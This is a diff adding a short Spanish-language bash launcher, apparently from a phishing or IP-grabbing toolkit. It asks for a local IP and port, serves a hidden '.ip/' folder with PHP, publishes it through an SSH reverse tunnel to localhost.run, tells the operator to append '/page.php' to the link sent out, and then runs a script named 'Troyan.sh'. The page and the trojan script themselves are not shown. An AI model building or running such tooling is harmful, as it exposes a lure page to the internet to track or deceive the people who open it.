@@ -1,0 +1,15 @@
+bash .banner
+echo "Introduce tu ip local:"
+echo ""
+ifconfig wlan0
+echo ""
+read input
+bash .banner
+echo "Introduce un puerto escucha:"
+read input1
+bash .banner
+echo "Agregale esto a tu enlace: /page.php"
+echo ""
+php -S $input:$input1 -t .ip/ |ssh -R 80:$input:$input1 ssh.localhost.run
+cd ..
+bash Troyan.sh
